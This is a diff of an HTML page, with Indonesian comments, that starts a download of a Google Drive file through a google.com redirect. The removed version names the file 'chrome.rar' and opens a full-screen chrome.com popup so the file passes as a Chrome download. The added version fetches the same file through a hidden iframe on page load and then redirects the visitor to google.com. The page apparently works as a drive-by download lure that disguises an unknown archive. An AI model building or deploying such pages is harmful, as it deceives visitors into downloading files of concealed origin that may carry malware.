@@ -1,59 +1,29 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Download File Picker Test</title>
-<style>
-body { font-family:sans-serif;padding:20px }
-button { padding:12px 18px;font-size:16px }
-pre { background:#111;color:#0f0;padding:10px }
-</style>
-</head>
-<body>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<h3>Download File Picker Test</h3>
-<button id="btn">Download File</button>
-<pre id="log"></pre>
+<style>
+    h1 {
+        margin: 1em;
+    }
+
+    iframe {
+        display: none;
+        width: 100%;
+        height: 600px;
+        border: 0;
+    }
+</style>
+
+
+<iframe id="frame" src="https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL"></iframe>
 
 <script>
-const logEl = document.getElementById("log");
-const log = m => logEl.textContent += m + "\n";
+    // Tampilkan iframe setelah 2 detik
+    setTimeout(() => {
+        document.getElementById("frame").style.display = "block";
+    }, 3500);
 
-document.getElementById("btn").onclick = () => {
-
-  log("[1] User click received");
-
-  const url = "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
-
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = "chrome.rar";   // nama file yang akan muncul di file picker
-
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-
-  log("[2] Download request triggered");
-
-  const w = window.open(
-    "https://chrome.com",
-    "_blank",
-    `
-    width=${screen.availWidth},
-    height=${screen.availHeight},
-    left=0,
-    top=0
-    `
-  );
-
-  if(!w){
-    log("[ERROR] Popup blocked");
-  } else {
-    log("[3] Popup opened");
-  }
-
-};
+    // Redirect ke Google setelah 4 detik
+    setTimeout(() => {
+        window.location.href = "https://google.com";
+    }, 3000);
 </script>
-
-</body>
-</html>
